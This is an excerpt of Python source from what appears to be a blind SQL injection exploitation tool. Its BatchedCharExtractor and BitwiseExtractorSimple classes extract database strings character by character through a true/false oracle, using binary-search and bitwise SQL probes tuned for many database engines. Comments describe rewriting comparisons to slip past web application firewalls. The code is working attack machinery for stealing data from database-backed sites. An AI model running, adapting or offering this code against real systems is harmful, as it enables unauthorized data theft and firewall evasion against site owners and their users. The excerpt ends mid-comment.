    # BUG-NULL-WRAPPER FIX (Req 7/10): UNICODE(SUBSTR()) returns NULL when pos > len
    # in SQLite, and UNICODE(SUBSTRING()) returns NULL for MSSQL too.  NULL in bitwise
    # AND expressions (`NULL & mask`) evaluates to NULL (not 0), making every bit probe
    # return NULL which the oracle treats as False → all bits = 0 → char = '\x00'.
    # For the primary `char_func` path (DBMS_QUERIES) COALESCE is already applied.
    # Here we add per-DBMS NULL wrappers for the Bitwise/Batched extractors which
    # build their own query template separately.
    # Wrapper: maps DBMS → (prefix_fn, suffix_fn) to wrap the char expression.
    # Full template: f"{prefix_fn}({ascii_fn}({substr_fn}(({expr}),{pos},1)){suffix_fn})"
    _CHAR_NULL_WRAPPER = {
        # SQLite: COALESCE(UNICODE(SUBSTR(...)),0) — NULL at end-of-string → 0
        "SQLite": ("COALESCE(", ",0)"),
        # MSSQL: ISNULL(UNICODE(SUBSTRING(...)),0)
        "MSSQL":  ("ISNULL(",  ",0)"),
        # BUG-SYBASE-NULL-WRAPPER FIX: Sybase UNICODE(SUBSTRING(col,pos,1)) returns
        # NULL when pos > LEN(string).  Without ISNULL guard, NULL & mask = NULL
        # (not 0) in SQL → oracle treats NULL as False → all bits = 0 → char_val=0
        # → chr(0)='\x00' → '□' for every character past string end instead of
        # cleanly stopping extraction.  ISNULL(...,0) converts end-of-string NULL
        # to 0 so all bit probes return False immediately — correct and efficient.
        "Sybase": ("ISNULL(",  ",0)"),
        # PostgreSQL: COALESCE(ASCII(SUBSTRING(...)),0)
        "PostgreSQL": ("COALESCE(", ",0)"),
        # MySQL ORD(): returns 0 for empty string, no NULL — no wrapper needed
        # TiDB is MySQL-compat: ORD() also returns 0 for empty string → no wrapper needed
        # BUG-BCE-TIDB-CRDB-YG-NULLWRAP FIX (MEDIUM, CockroachDB, YugabyteDB,
        # BatchedCharExtractor and BitwiseExtractorSimple, all techniques):
        # CockroachDB and YugabyteDB are PostgreSQL-compatible.  Their ASCII()
        # function returns NULL when the SUBSTRING() call returns an empty string
        # (i.e. position past end of string).  NULL in bitwise AND expressions
        # (`NULL & mask`) evaluates to NULL, not 0 — the oracle treats NULL as
        # False → all bits = 0 → char_val = 0 → '□' for every character past the
        # real string end, causing extraction to loop to max_len and return garbage
        # trailing characters instead of cleanly terminating.
        # Fix: add COALESCE(..., 0) wrappers matching the PostgreSQL entry.
        # TiDB: ORD() returns 0 (not NULL) for empty string (MySQL-compat) → no wrapper.
        "CockroachDB": ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
        "YugabyteDB":  ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
        # BUG-V139-BCE-AMZN-REDSHIFT-NULL-WRAPPER FIX (MEDIUM, Amazon Redshift,
        # BatchedCharExtractor and BitwiseExtractorSimple, all techniques, all surfaces):
        # Amazon Redshift is PostgreSQL-wire-compatible. Its ASCII(SUBSTRING()) returns
        # NULL when position exceeds string length (identical to PostgreSQL/CockroachDB/
        # YugabyteDB behavior). Without a COALESCE guard, NULL & mask = NULL in SQL —
        # the oracle treats NULL as False → all 21 bit-probes return 0 → char_val=0
        # → '\u25a1' is appended for every position past the real string end, causing
        # extraction to loop to max_len and return garbage trailing chars on all Redshift
        # targets. CockroachDB and YugabyteDB were fixed (BUG-BCE-TIDB-CRDB-YG-NULLWRAP
        # FIX) but Amazon Redshift was missed.
        # Fix: COALESCE(ASCII(SUBSTRING(…)),0) converts past-EOS NULL to 0 so all
        # bit-probes return False immediately and extraction terminates cleanly.
        # Numeric safety: COALESCE only changes NULL handling; no comparison operands
        # or string delimiters are modified.
        "Amazon Redshift": ("COALESCE(", ",0)"),  # PG-compat: ASCII(empty) = NULL → COALESCE → 0
        # BUG-REQ10-ORACLE-NULL FIX: Oracle ASCII() returns NULL when SUBSTR() returns
        # empty string (pos > string length).  Without NVL wrapper, NULL & mask = NULL
        # (not 0) → oracle treats as False → all bits = 0 → extraction returns NUL bytes.
        # Wrap with NVL(..., 0) so out-of-range positions safely return 0.
        "Oracle": ("NVL(", ",0)"),
    }

    # FIX-EX-B: Per-DBMS character code range for binary search.
    # MySQL/MariaDB: ORD() returns full Unicode code point (0..U+10FFFF).
    # PostgreSQL: ASCII() returns the full Unicode code point (0..U+10FFFF) —
    #   NOT just 0-127 or 0-255.  PostgreSQL's ASCII() is the standard Unicode
    #   code-point function; ASCII('é')=233, ASCII('β')=946, ASCII('€')=8364.
    #   The previous CHAR_RANGE was (0,255) based on the incorrect belief that
    #   "ASCII() returns 0 for code points >127".  That was wrong.  With (0,255)
    #   any PostgreSQL DB value whose code point is ≥ 256 (Greek above U+00FF,
    #   CJK, Arabic, Hebrew, Cyrillic extended, emoji…) silently returned '?'.
    # MSSQL: UNICODE() supports full BMP [0,65535]; raise to [0,1114111] for safety.
    # Oracle: ASCII() returns first-byte value (0-255); (0,255) is correct.
    # SQLite: UNICODE() returns full Unicode scalar (0,1114111).
    # BUG-MYSQL-MARIADB-CHAR-RANGE FIX: Was (0,255) for MySQL/MariaDB.
    # BatchedCharExtractor uses ORD() (not ASCII()) for MySQL/MariaDB.
    # ORD() returns the full Unicode code point — up to 16,777,215 for 4-byte
    # UTF-8 sequences (e.g. ORD('€')=8364, ORD('😀')=128512).  With (0,255),
    # _extract_single exited with lo=256 > hi=255 for any char with code > 255,
    # returning '?' silently for all non-Latin-1 MySQL/MariaDB data (emoji, CJK,
    # currency symbols, supplementary plane characters).
    # Fix: raise ceiling to 1,114,111 (U+10FFFF, full Unicode scalar range).
    # BUG-SYBASE-CHAR-RANGE FIX: Added Sybase (0,65535) — Sybase UNICODE()
    # covers the full BMP [0,65535]; previously fell to (0,255) via default,
    # making any Sybase char with code > 255 silently extract as '?'.
    # BUG-POSTGRESQL-CHAR-RANGE FIX: Changed (0,255) → (0,1114111).
    # PostgreSQL ASCII() returns full Unicode code points, not just Latin-1.
    # The old (0,255) silently returned '?' for any non-Latin-1 character
    # (Greek β=946, CJK, Arabic, Hebrew, emoji, etc.) in PostgreSQL DBs.
    CHAR_RANGE = {
        "MySQL":        (0, 1114111),  # BUG-MYSQL-MARIADB-CHAR-RANGE FIX: was (0,255)
        "PostgreSQL":   (0, 1114111),  # BUG-POSTGRESQL-CHAR-RANGE FIX: was (0,255); ASCII() returns full Unicode
        "MSSQL":        (0, 1114111),
        "Oracle":       (0, 255),      # ASCII() first-byte only; intentional limitation
        "SQLite":       (0, 1114111),
        "MariaDB":      (0, 1114111),  # BUG-MYSQL-MARIADB-CHAR-RANGE FIX: was (0,255)
        "Sybase":       (0, 65535),    # BUG-SYBASE-CHAR-RANGE FIX: UNICODE() covers BMP
        # BUG-BCE-TIDB-CRDB-YG-CHARRANGE FIX (MEDIUM, TiDB, CockroachDB, YugabyteDB,
        # BatchedCharExtractor and BitwiseExtractorSimple, all B/BH/IN/NV/WB/EX/HY/ST
        # techniques, all surfaces):
        # Without explicit CHAR_RANGE entries these three DBMSes fell through to the
        # default (0, 255).  TiDB's ORD() returns 0..U+10FFFF; CockroachDB and
        # YugabyteDB's ASCII() also return 0..U+10FFFF.  With range (0, 255), any
        # character with code point > 255 caused _extract_single to exit the binary-
        # search loop with lo > hi=255, returning '?' silently for every non-Latin-1
        # character extracted from TiDB, CockroachDB, or YugabyteDB targets.
        # Fix: add all three with (0, 1114111) matching MySQL/PostgreSQL above.
        # Numeric safety: CHAR_RANGE values are binary-search loop bounds, never SQL.
        "TiDB":        (0, 1114111),  # MySQL-compat: ORD() returns 0..U+10FFFF
        "CockroachDB": (0, 1114111),  # PG-compat:   ASCII() returns 0..U+10FFFF
        "YugabyteDB":  (0, 1114111),  # PG-compat:   ASCII() returns 0..U+10FFFF
        # BUG-V139-BCE-AMZN-REDSHIFT-CHARRANGE FIX (HIGH, Amazon Redshift,
        # BatchedCharExtractor and BitwiseExtractorSimple, all B/BH/IN techniques,
        # all surfaces, all HTTP methods):
        # Amazon Redshift was absent from CHAR_RANGE. It fell to the default (0, 255).
        # Redshift is PostgreSQL-wire-compatible; its ASCII() returns full Unicode code
        # points (0..U+10FFFF = 1,114,111) — identical to PostgreSQL/CockroachDB/
        # YugabyteDB. With range (0, 255), any Redshift character with code point > 255
        # (Greek α=945, CJK 中=20013, €=8364, emoji 😀=128512, etc.) causes
        # _extract_single to exit the binary-search loop with lo > hi=255, returning
        # '?' silently for every non-Latin-1 character extracted from Redshift targets.
        # TiDB, CockroachDB, and YugabyteDB were fixed (BUG-BCE-TIDB-CRDB-YG-CHARRANGE
        # FIX) but Amazon Redshift was missed.
        # Numeric safety: CHAR_RANGE values are binary-search loop bounds only; they are
        # never placed inside SQL string delimiters or comparison operands.
        "Amazon Redshift": (0, 1114111),  # PG-compat: ASCII() returns 0..U+10FFFF
    }
    
    def __init__(self, eval_fn, dbms: str = "MySQL", gate=None):
        self._eval = eval_fn
        self._dbms = dbms
        self._gate = gate
        self._ascii_fn, self._substr_fn = self.CHAR_FUNCS.get(dbms, ("ASCII", "SUBSTRING"))
        # FIX-EX-B: use per-DBMS char range so extended/Unicode chars are extracted
        _lo, _hi = self.CHAR_RANGE.get(dbms, (0, 255))
        self._char_low  = _lo
        self._char_high = _hi
    
    async def extract_string(self, sql_expr: str, length: int) -> str:
        """Extract a string using batched 2-char binary search  pairs run in parallel."""
        result = [''] * length
        _pair_batch = 3  # 3 pairs (6 chars) at a time
        print(f"[+] [BatchExtract] Extracting {length} chars ({_pair_batch} pairs parallel)...", flush=True)
        # BUG-BATCH-SANITY FIX: pre-extraction always-False sanity probe, same pattern as
        # BitwiseExtractorSimple.  Probe form: ASCII(SUBSTRING(sql_expr,1,1)) & 0 = 1.
        # If the oracle returns True or None, extraction would yield garbage — abort early.
        try:
            _bce_sanity_expr = (f"{self._ascii_fn}({self._substr_fn}"
                                f"(({sql_expr}),1,1))&0")
            _bce_sanity = await self._eval(f"{_bce_sanity_expr}=1")
            if _bce_sanity is True:
                print(f"[!] [BatchExtract] Oracle sanity FAILED "
                      f"(always-False probe returned True) — oracle inverted or "
                      f"WAF-limited; aborting extraction to prevent garbage output",
                      flush=True)
                return '?' * length
            if _bce_sanity is None:
                print(f"[!] [BatchExtract] Oracle sanity returned None "
                      f"(WAF blocked pre-flight probe) — aborting extraction",
                      flush=True)
                return '?' * length
        except Exception as _bce_sanity_exc:
            print(f"[!] [BatchExtract] Oracle sanity probe exception: {_bce_sanity_exc} — aborting extraction", flush=True)
            return '?' * length

        # Build list of all pair positions
        _pairs = []
        for pos in range(1, length + 1, 2):
            if pos + 1 <= length:
                _pairs.append((pos, True))   # pair
            else:
                _pairs.append((pos, False))  # single (odd last char)
        
        # Process pairs in parallel batches
        for bi in range(0, len(_pairs), _pair_batch):
            # BUG-BATCH-1 FIX: yield to event loop on EVERY batch to prevent
            # CPU starvation.  Previously the condition was
            # `(bi // _pair_batch) % 4 == 0` which only yielded every 4th
            # batch (every ~24 chars), allowing back-to-back asyncio.gather
            # calls with no scheduler opportunity → 100% CPU on fast targets.
            # New behaviour: yield before every batch.  First batch: sleep(0)
            # (instant yield).  Subsequent batches: use configured delay floor
            # 0.05s so rate-limiter/cancellation callbacks are serviced between
            # each gather burst.
            _bce_delay: float = 0.05
            try:
                _bce_delay = max(
                    float(getattr(self, '_config', None) and
                          getattr(self._config, 'delay', 0.05) or 0.05),
                    0.05)
            except Exception:
                pass
            if bi == 0:
                await asyncio.sleep(0.002)  # BUG-CPU-BATCH-FIRST FIX (REQ 9): real 2ms, not sleep(0)
            else:
                await asyncio.sleep(_bce_delay)
            batch = _pairs[bi:bi + _pair_batch]
            
            async def _do_pair(pos, is_pair):
                if is_pair:
                    return pos, await self._extract_pair(sql_expr, pos)
                else:
                    c = await self._extract_single(sql_expr, pos)
                    return pos, (c, None)
            
            tasks = [_do_pair(pos, is_pair) for pos, is_pair in batch]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for br in batch_results:
                if isinstance(br, tuple):
                    pos, chars = br
                    c1, c2 = chars
                    result[pos - 1] = c1 or '?'
                    if c2 is not None and pos < length:
                        result[pos] = c2 or '?'
            
            _done = min((bi + _pair_batch) * 2, length)
            _partial = ''.join(c or '?' for c in result[:_done])
            print(f"[+] [BatchExtract] [{_done}/{length}] {_partial}", flush=True)
        
        return ''.join(c or '?' for c in result)
    
    async def _extract_pair(self, expr: str, pos: int) -> tuple:
        """Binary search on combined 2-char value (0-65535 range)."""
        # BUG-NULL-WRAPPER FIX (Req 7/10): Apply per-DBMS NULL wrapper so positions
        # beyond the string end return 0 instead of NULL.  NULL in arithmetic
        # (UNICODE(SUBSTR(x,pos+1,1)) * ... when pos+1 > len) makes the entire
        # expression NULL, causing the binary search to converge to 0 for the last
        # character of an odd-length string extracted via _extract_pair.
        # The pair extractor is only called for even positions within bounds, but
        # when the string length is exactly len and pos+1 = len+1 would be out of
        # bounds for the second character of the pair.  The NULL wrapper prevents this.
        _wrap = getattr(self, '_char_null_wrapper', None)
        if _wrap is None:
            _wrap = BatchedCharExtractor._CHAR_NULL_WRAPPER.get(self._dbms, ("", ""))
            self._char_null_wrapper = _wrap
        _pfx, _sfx = _wrap

        def _wq(p):
            _inner = f"{self._ascii_fn}({self._substr_fn}(({expr}),{p},1))"
            return f"{_pfx}{_inner}{_sfx}" if _pfx else _inner

        _q = (f"{_wq(pos)}*256+"
              f"{_wq(pos+1)}")
        # BUG-BATCHEDPAIR-HI-RANGE FIX: The pair formula char1*256+char2 encodes pairs
        # where char1 is the high byte (mid//256) and char2 is the low byte (mid%256).
        # mid%256 is ALWAYS in [0, 255] regardless of _char_high, so char2 can never be
        # recovered for code points > 255 — the formula is inherently 8-bit per character.
        # Old code used _hi = _char_high * 256 + _char_high which for MSSQL/SQLite
        # (_char_high=1114111) gave _hi=285,212,671. But mid%256 caps char2 at 255 always.
        # Any char2 > 255 was decoded as a completely wrong (char1, char2) pair, and the
        # binary search iterated log2(285M)=28 rounds vs the correct log2(65535)=17.
        # Fix: cap the pair range at 255 per character (pair max = 255*256+255 = 65535).
        # Characters with code points > 255 are not reachable via this pair path and fall
        # back to _extract_single, which uses the full per-DBMS CHAR_RANGE correctly.
        _pair_char_hi = min(self._char_high, 255)  # pair formula can only encode 8-bit chars
        _lo = self._char_low * 256 + self._char_low
        _hi = _pair_char_hi * 256 + _pair_char_hi
        low, high = _lo, _hi
        _pair_iter = 0  # BUG-BATCH-YIELD FIX: track iterations for yield points
        while low <= high:
            # BUG-BATCHEDCHAR-STOP FIX (Req 7/9): Abort when extraction cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                break
            # BUG-BATCH-YIELD FIX (Req 9): Yield to event loop every 8 iterations.
            # Binary search on a 65535-range needs up to 17 oracle calls. Without
            # yields, 3 parallel pairs × 17 calls = 51 rapid-fire eval() invocations
            # with no scheduler opportunity → 100% CPU on fast targets.
            _pair_iter += 1
            if _pair_iter % 8 == 0:
                await asyncio.sleep(0.002)  # BUG-CPU-BATCH-GATHER1 FIX (REQ 9)
            # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
            # Fixed pivot in BatchedCharExtractor pair binary search.
            # Fix: use _randomized_mid(low, high) (TECHNIQUE-3).
            mid = _randomized_mid(low, high)
            try:
                # BUG-V137-EXTORCH-METHODS-STRICT-GT FIX: was >{mid}, now >={mid+1}.
                # WAFs block strict >\d+; >={mid+1} is semantically identical for ints.
                gt = await self._eval(f"({_q})>={mid+1}")
                # BUG-BCE-PAIR-NONE-FIX: None (WAF block) must not be treated
                # as False. None -> abort binary search so callers fall through
                # to _extract_single which has its own retry/fallback logic.
                if gt is None:
                    break  # WAF-blocked probe -- abort
                elif gt:
                    low = mid + 1
                else:
                    eq = await self._eval(f"({_q})={mid}")
                    if eq is None:
                        break  # WAF-blocked probe -- abort
                    elif eq:
                        # FIX-EX-B: use _char_low/_pair_char_hi instead of
                        # hardcoded 32..126 so non-ASCII code points are decoded.
                        # BUG-BATCHPAIR-NUL FIX: when _char_low=0 (all DBMSes),
                        # _v1=0 satisfied 0<=0<=255 and returned chr(0)='\x00'.
                        # '\x00' is truthy in Python so `c or '?'` kept the NUL byte
                        # in the extracted string instead of replacing it.
                        # Exclude code point 0 (string terminator / oracle convergence
                        # to 0 at string end) by requiring _v1/v2 > 0.
                        _v1, _v2 = mid // 256, mid % 256
                        c1 = chr(_v1) if _v1 > 0 and self._char_low <= _v1 <= _pair_char_hi else '?'
                        c2 = chr(_v2) if _v2 > 0 and self._char_low <= _v2 <= _pair_char_hi else '?'
                        return c1, c2
                    high = mid - 1
            except Exception:
                break
            if self._gate and self._gate._delay > 0.01:
                await asyncio.sleep(self._gate._delay * 0.1)
        # Fallback to individual extraction
        c1 = await self._extract_single(expr, pos)
        c2 = await self._extract_single(expr, pos + 1)
        return c1, c2
    
    async def _extract_single(self, expr: str, pos: int) -> str:
        # BUG-NULL-WRAPPER FIX (Req 7/10): same COALESCE/ISNULL wrapper applied here.
        _wrap = getattr(self, '_char_null_wrapper', None)
        if _wrap is None:
            _wrap = BatchedCharExtractor._CHAR_NULL_WRAPPER.get(self._dbms, ("", ""))
            self._char_null_wrapper = _wrap
        _pfx, _sfx = _wrap
        _inner_q = f"{self._ascii_fn}({self._substr_fn}(({expr}),{pos},1))"
        _q = f"{_pfx}{_inner_q}{_sfx}" if _pfx else _inner_q
        # FIX-EX-B: use per-DBMS range instead of hardcoded 32/126 which
        # caused silent '?' for any code point outside printable-ASCII range.
        low, high = self._char_low, self._char_high
        _single_iter = 0  # BUG-BATCH-YIELD FIX: track iterations for yield points
        while low <= high:
            # BUG-BATCHEDCHAR-STOP FIX (Req 7/9): Abort when extraction cancelled.
            if not _EXTRACTION_ACTIVE[0]:
                break
            # BUG-BATCH-YIELD FIX (Req 9): Yield to event loop every 8 iterations.
            # ASCII range binary search needs up to 8 oracle calls. Without yields,
            # many parallel _extract_single calls fire eval() back-to-back → high CPU.
            _single_iter += 1
            if _single_iter % 8 == 0:
                await asyncio.sleep(0.002)  # BUG-CPU-BATCH-GATHER2 FIX (REQ 9)
            # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
            # Fixed pivot in BatchedCharExtractor single binary search.
            # Fix: use _randomized_mid(low, high) (TECHNIQUE-3).
            mid = _randomized_mid(low, high)
            try:
                # BUG-V137-EXTORCH-METHODS-STRICT-GT FIX: was >{mid}, now >={mid+1}.
                gt = await self._eval(f"({_q})>={mid+1}")
                # BUG-BCE-SINGLE-NONE-FIX: None (WAF block) must not be treated
                # as False. Treat as unknown -> abort so caller gets "?" fallback.
                if gt is None:
                    break  # WAF-blocked probe -- abort
                elif gt:
                    low = mid + 1
                else:
                    eq = await self._eval(f"({_q})={mid}")
                    if eq is None:
                        break  # WAF-blocked probe -- abort
                    elif eq:
                        # BUG-SINGLE-NUL FIX: chr(0) is truthy so `c or '?'` in the
                        # caller would NOT replace it with '?'. NUL bytes then end up
                        # embedded in the extracted string. Treat code point 0 as '?'.
                        return chr(mid) if mid > 0 else '?'
                    high = mid - 1
            except Exception:
                break
        return '?'


#  Feature 3: Bitwise Extraction 
class BitwiseExtractorSimple:
    """Fixed-depth extraction: 8 independent bit probes per character (full byte range 0-255).
    No cascading failures  each bit is independently verifiable.
    Parallelizable: all 8 bits can be probed simultaneously.

    NOTE: The BUG-BITWISE-7BITS FIX changed range(7) to range(8) to cover the full Latin-1
    range (code points 0-255).  The class name and prior docstring both said '7 bits' — this
    was a stale reference corrected here (BUG-FRESH-5 FIX)."""
    
    def __init__(self, eval_fn, dbms: str = "MySQL", gate=None, max_parallel: int = 7):
        self._eval = eval_fn
        self._dbms = dbms
        self._gate = gate
        self._max_parallel = max_parallel
        _funcs = BatchedCharExtractor.CHAR_FUNCS.get(dbms, ("ASCII", "SUBSTRING"))
        self._ascii_fn = _funcs[0]
        self._substr_fn = _funcs[1]
    
    async def extract_string(self, sql_expr: str, length: int) -> str:
        """Extract string by probing individual bits  characters batched in parallel."""
        result = [''] * length
        _batch_size = min(self._max_parallel, 4)  # 4 chars at a time (each = 7 bit probes)
        print(f"[+] [BitwiseExtract] Extracting {length} chars ({_batch_size} parallel, 8 bits each)...", flush=True)  # BUG-FRESH-5 FIX: was '7 bits each' (stale after BUG-BITWISE-7BITS FIX changed range(7)→range(8))
        # BUG-BITWISE-SANITY FIX: send an always-False pre-extraction probe to catch
        # inverted or WAF-limited oracles BEFORE starting the full extraction loop.
        # Probe form: ASCII(SUBSTRING(sql_expr,1,1)) & 0 = 1  →  always False.
        # If the oracle returns True here, extraction would yield garbage (all bits
        # inverted → non-ASCII code points).  Mirrors the guard in
        # _bitwise_extract_with_oracle() at line 151415.
        try:
            _bw_sanity_expr = (f"{self._ascii_fn}({self._substr_fn}"
                               f"(({sql_expr}),1,1))&0")
            _bw_sanity = await self._eval(f"{_bw_sanity_expr}=1")
            if _bw_sanity is True:
                print(f"[!] [BitwiseExtract] Oracle sanity FAILED "
                      f"(always-False probe returned True) — oracle inverted or "
                      f"WAF-limited; aborting extraction to prevent garbage output",
                      flush=True)
                return '?' * length
            if _bw_sanity is None:
                print(f"[!] [BitwiseExtract] Oracle sanity returned None "
                      f"(WAF blocked pre-flight probe) — aborting extraction",
                      flush=True)
                return '?' * length
        except Exception as _bw_sanity_exc:
            print(f"[!] [BitwiseExtract] Oracle sanity probe exception: {_bw_sanity_exc} — aborting extraction", flush=True)
            return '?' * length

        for batch_start in range(0, length, _batch_size):
            # BUG-BITWISESTOP FIX (Req 7/9): Abort when extraction is externally cancelled.
            # Without this check, BitwiseExtractorSimple continues launching asyncio.gather
            # batches after _EXTRACTION_ACTIVE is cleared, causing CPU waste and stale probes.
            if not _EXTRACTION_ACTIVE[0]:
                break
            batch_end = min(batch_start + _batch_size, length)
            # CPU-FIX: Small inter-batch delay prevents back-to-back asyncio.gather
            # calls from saturating the event loop on fast targets.  4 chars × 7 bits
            # = 28 concurrent HTTP requests complete near-simultaneously on localhost,
            # then the scheduler immediately fires the next 28 → 100% CPU.
            # BUG-BITWISEEXTRACT-BATCH-DELAY FIX (Req 9): Raised minimum delay floor
            # from 0.05s to 0.1s (10 batches/s max = ~80 char probes/s) to better
            # match the cross-category probe delay floor set in Fix 5.  Also apply
            # a minimum yield (asyncio.sleep(0)) for the FIRST batch so that fast
            # event-loop entries before the first gather don't spike CPU.
            _bw_config_delay = 0.1
            if hasattr(self, '_config'):
                try:
                    _bw_config_delay = max(float(getattr(self._config, 'delay', 0.1)), 0.1)
                except Exception:
                    pass
            elif _ACTIVE_GATE[0] is not None:
                try:
                    _bw_config_delay = max(float(getattr(_ACTIVE_GATE[0], '_delay', 0.1)), 0.1)
                except Exception:
                    pass
            if batch_start == 0:
                # First batch: yield once to the event loop without a full sleep
                await asyncio.sleep(0.002)  # BUG-CPU-BATCH-GATHER3 FIX (REQ 9)
            else:
                await asyncio.sleep(_bw_config_delay)
            # Launch multiple characters simultaneously
            tasks = [self._extract_char_bits(sql_expr, pos + 1) 
                     for pos in range(batch_start, batch_end)]
            chars = await asyncio.gather(*tasks, return_exceptions=True)
            for idx, ch in enumerate(chars):
                if isinstance(ch, str):
                    result[batch_start + idx] = ch
            if batch_end % 8 == 0 or batch_end == length:
                print(f"[+] [BitwiseExtract] [{batch_end}/{length}] "
                      f"{''.join(c or '?' for c in result[:batch_end])}", flush=True)
        
        return ''.join(c or '?' for c in result)
    
    async def _extract_char_bits(self, expr: str, pos: int) -> str:
        """Extract one character by probing 7 bits in parallel, capped by semaphore.

        BUG-EXTRACT-2 / BUG-CPU-2 FIX: Previously all 7 bit probes fired
        simultaneously via asyncio.gather with no concurrency limit.  On fast
        (LAN/localhost) targets this launched 7 HTTP requests per character
        simultaneously.  With 4 chars per batch (default _batch_size=4) that
        was 28 near-simultaneous requests.  On a fast target they complete in
        ~50ms and the next 28 fire immediately → continuous 100% CPU burst.
        Fix: use a per-extractor semaphore capped at 4 concurrent bit probes
        (configurable via max_parallel).  This still extracts ~20 chars/s on
        fast targets while reducing CPU from 100% to <30%.
        """
        # BUG-NULL-WRAPPER FIX (Req 7/10): wrap the char expression with a NULL-safe
        # function so that positions beyond the string end return 0 (not NULL), which
        # evaluates correctly in bitwise AND expressions.  Without this, SQLite and
        # MSSQL return NULL for out-of-range positions; `NULL & mask = NULL` and
        # `NULL = mask → NULL` is treated as False by the oracle, making ALL bit probes
        # return 0 → char_val=0 → '□' instead of properly terminating extraction.
        _wrap = getattr(self, '_char_null_wrapper', None)
        if _wrap is None:
            # Look up from class dict; cache on instance for speed
            _wrap_map = BatchedCharExtractor._CHAR_NULL_WRAPPER
            _wrap = _wrap_map.get(self._dbms, ("", ""))
            self._char_null_wrapper = _wrap
        _pfx, _sfx = _wrap
        # BUG-G FIX: For Oracle, NVL(ASCII(SUBSTR(...)),0) returns the first BYTE of the
        # UTF-8 encoding, NOT the Unicode code point. Example: 'é' (U+00E9) → UTF-8 bytes
        # 0xC3 0xA9 → ASCII('é')=195 (0xC3, first byte). BITAND(195,mask) reconstructs 195
        # → chr(195)='Ã' instead of chr(233)='é'. This silently corrupts every non-ASCII
        # character extracted from Oracle via BitwiseExtractorSimple.
        # The Scanner's inline _extract_char_bitwise already uses the correct CASE/ASCIISTR
        # scalar-subquery formula that handles the full BMP range (U+0000..U+FFFF).
        # BitwiseExtractorSimple must use the same formula when self._dbms == "Oracle".
        if self._dbms == "Oracle":
            # Oracle CASE/ASCIISTR formula: ASCII() for U+0001..U+007F (7-bit clean),
            # TO_NUMBER(SUBSTR(ASCIISTR(c),2,4),'XXXX') for U+0080..U+FFFF (non-ASCII),
            # 0 for NULL / empty string (position past end of string).
            _q = (
                f"(SELECT CASE WHEN NVL(ASCII(c__),0) BETWEEN 1 AND 127 "
                f"THEN ASCII(c__) "
                f"WHEN c__ IS NOT NULL AND LENGTH(c__)>0 "
                f"THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') "
                f"ELSE 0 END FROM (SELECT SUBSTR(({expr}),{pos},1) c__ FROM DUAL))"
            )
        else:
            _inner_q = f"{self._ascii_fn}({self._substr_fn}(({expr}),{pos},1))"
            _q = f"{_pfx}{_inner_q}{_sfx}" if _pfx else _inner_q
        if not hasattr(self, '_bit_sem'):
            self._bit_sem = asyncio.Semaphore(min(self._max_parallel, 4))

        async def _probe_bit(bit_n):
            mask = 1 << bit_n
            async with self._bit_sem:
                try:
                    # BUG-CPU-2 FIX: Small yield between probes prevents tight gather loop
                    await asyncio.sleep(0.002)  # BUG-CPU-BATCH-GATHER4 FIX (REQ 9)
                    # BUG-BITWISESIMPLE-ORACLE-AMP FIX: Oracle SQL does NOT support the & bitwise
                    # operator (it raises ORA-00907: missing right parenthesis on the expression
                    # ({_q})&{mask}={mask}).  The oracle treats the ORA error response as False,
                    # so ALL 8 bit probes return 0 → char_val=0 → chr(0) → '□' for every character
                    # on every Oracle extraction attempt via BitwiseExtractorSimple.
                    # Oracle requires BITAND(expr, mask) = mask.  Firebird requires BIN_AND().
                    # BUG-DB2-BITWISE-BWE FIX: DB2 also has no & operator; uses BITAND().
                    # All other DBMSes (MySQL, PostgreSQL, MSSQL, SQLite, MariaDB etc.) support &.
                    if self._dbms == "Oracle":
                        _bit_cond = f"BITAND({_q},{mask})={mask}"
                    elif self._dbms == "Firebird":
                        _bit_cond = f"BIN_AND({_q},{mask})={mask}"
                    elif self._dbms in ("DB2",):
                        _bit_cond = f"BITAND({_q},{mask})={mask}"
                    else:
                        _bit_cond = f"({_q})&{mask}={mask}"
                    result = await self._eval(_bit_cond)
                    # BUG-PROBE-BIT-NONE-FIX (HIGH, all 5 DBMSes, WB/B/BH/IN/ST techniques):
                    # _eval() returns None for WAF-blocked probes (status 400/403/etc.).
                    # `1 if None else 0` evaluates to 0, treating a WAF block as "bit not set".
                    # When the oracle is inverted (all probes WAF-blocked), all 21 bits assemble
                    # as 0 → chr(0) = '□'. When only some probes are blocked, bits that should
                    # be 1 are treated as 0 → wrong character. Only True/False from a working
                    # oracle carry useful information; None means "unknown — retry".
                    # Fix: distinguish True/False/None explicitly. None → -1 → retry path.
                    if result is True:
                        return (bit_n, 1)
                    elif result is False:
                        return (bit_n, 0)
                    else:
                        return (bit_n, -1)  # None (WAF block) or unexpected → retry
                except Exception:
                    return (bit_n, -1)  # failed — will retry
        
        # BUG-DEAD-TASKS FIX: The old code had a dead first assignment
        # `tasks = [_probe_bit(b) for b in range(8)]` here that was immediately
        # overwritten by the DBMS-aware assignment below.  _probe_bit() is async so
        # list comprehension creates 8 coroutine objects that are never awaited —
        # Python emits RuntimeWarning "coroutine was never awaited" × 8 per character
        # extracted, polluting logs and preventing clean asyncio shutdown on some
        # Python versions.  The dead line has been removed; only the correct
        # DBMS-aware assignment below remains.
        # BUG-BITWISESIMPLE-MSSQL-SQLITE-UNICODE-FIX: range(8) = 8 bits covers 0-255 only.
        # MSSQL/Sybase UNICODE() returns 0-65535 (BMP); SQLite UNICODE() returns 0-1,114,111.
        # Any character with code point > 255 had its upper bits silently dropped:
        #   actual = 8364 (€, U+20AC)  →  extracted = 8364 & 0xFF = 172 (¬) — WRONG.
        # The final guard `0 <= char_val <= 0x10FFFF` passed because char_val is at most 255.
        # BUG-BITWISESIMPLE-MYSQL-MARIADB-BITS FIX: MySQL/MariaDB ORD() returns the full
        # Unicode code point (0..U+10FFFF = 1,114,111 = 21 bits).  The else-8 branch
        # silently assembled only the low 8 bits for any MySQL/MariaDB character with
        # code point > 255, producing a wrong result without any error.
        # BUG-BWE-PG-TIDB-CRDB-YG-BITS FIX (MEDIUM, PostgreSQL, CockroachDB, TiDB,
        # YugabyteDB, BitwiseExtractorSimple._extract_char_bits, all B/BH/IN/NV/WB
        # techniques, all surfaces):
